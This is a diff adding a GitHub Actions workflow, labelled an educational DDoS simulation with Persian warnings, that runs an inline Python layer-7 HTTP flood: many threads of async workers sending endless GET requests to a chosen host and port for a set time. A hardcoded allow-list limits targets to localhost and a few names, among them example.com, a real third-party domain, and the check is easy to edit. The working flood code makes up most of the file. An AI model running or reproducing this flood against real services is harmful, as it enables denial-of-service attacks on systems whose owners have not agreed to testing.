@@ -1,0 +1,108 @@
+name: DDoS Simulation Toolkit (Educational PoC)
+
+on:
+  workflow_dispatch:
+    inputs:
+      attack:
+        description: 'نوع حمله (مثال: l7_http_flood)'
+        required: true
+        default: 'l7_http_flood'
+      target:
+        description: 'آدرس هدف (فقط سیستم‌های خودتان)'
+        required: true
+        default: 'localhost'
+      port:
+        description: 'پورت هدف'
+        required: true
+        default: '443'
+      duration:
+        description: 'مدت زمان شبیه‌سازی (ثانیه)'
+        required: true
+        default: '10'
+      threads:
+        description: 'تعداد نخ‌های هم‌زمان'
+        required: true
+        default: '10'
+
+jobs:
+  simulate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: نمایش هشدار امنیتی
+        run: |
+          echo "=============================================="
+          echo "  ⚠️  هشدار: این ابزار فقط برای آموزش و تست  "
+          echo "  سیستم‌های شخصی طراحی شده است."
+          echo "  استفاده غیرمجاز ممنوع و پیگرد قانونی دارد."
+          echo "=============================================="
+
+      - name: نصب پیش‌نیازها
+        run: pip3 install aiohttp rich
+
+      - name: اجرای اسکریپت حمله
+        env:
+          ATTACK_TYPE: ${{ github.event.inputs.attack }}
+          TARGET_HOST: ${{ github.event.inputs.target }}
+          TARGET_PORT: ${{ github.event.inputs.port }}
+          DURATION: ${{ github.event.inputs.duration }}
+          THREADS: ${{ github.event.inputs.threads }}
+        run: |
+          python3 - << 'PYEOF'
+          import asyncio, aiohttp, time, os, sys
+          from rich.console import Console
+
+          console = Console()
+          console.print("[bold red]DDoS Simulation Toolkit (PoC)[/bold red]")
+          console.print("[yellow]فقط برای تست سیستم‌های تحت کنترل خودتان![/yellow]")
+
+          attack_type = os.environ.get("ATTACK_TYPE", "l7_http_flood")
+          target = os.environ.get("TARGET_HOST", "localhost")
+          port = int(os.environ.get("TARGET_PORT", 443))
+          duration = int(os.environ.get("DURATION", 10))
+          threads = int(os.environ.get("THREADS", 10))
+
+          console.print(f"هدف: {target}:{port}")
+          console.print(f"نوع: {attack_type}")
+          console.print(f"مدت: {duration}s | نخ‌ها: {threads}")
+
+          if target not in ("localhost", "127.0.0.1", "example.com", "your-site.com"):
+              console.print("[red]❌ هدف غیرمجاز! فقط localhost یا سایت خودتان.[/red]")
+              sys.exit(1)
+
+          async def http_worker(url):
+              async with aiohttp.ClientSession() as session:
+                  while True:
+                      try:
+                          async with session.get(url, timeout=5) as resp:
+                              console.print(f"[dim]✓ {resp.status}[/dim]", end="")
+                      except:
+                          console.print("[dim]✗[/dim]", end="")
+
+          def run_http_flood(url, num_workers):
+              loop = asyncio.new_event_loop()
+              asyncio.set_event_loop(loop)
+              tasks = [http_worker(url) for _ in range(num_workers)]
+              loop.run_until_complete(asyncio.gather(*tasks))
+
+          if attack_type == "l7_http_flood":
+              scheme = "http" if port != 443 else "https"
+              url = f"{scheme}://{target}:{port}" if port not in (80, 443) else f"{scheme}://{target}"
+              console.print(f"🎯 ارسال درخواست به {url}")
+              # اجرا به صورت چند ریسمانی
+              import threading
+              for _ in range(threads):
+                  t = threading.Thread(target=run_http_flood, args=(url, 5))
+                  t.daemon = True
+                  t.start()
+              time.sleep(duration)
+              console.print("\n[green]✅ شبیه‌سازی پایان یافت.[/green]")
+          else:
+              console.print(f"[red]❌ حمله '{attack_type}' پشتیبانی نمی‌شود.[/red]")
+          PYEOF
+
+      - name: پایان و یادآوری
+        run: |
+          echo "=============================================="
+          echo "  ابزار صرفاً آموزشی بود."
+          echo "  از آن در برابر سیستم‌های غیرمجاز استفاده نکنید."
+          echo "=============================================="
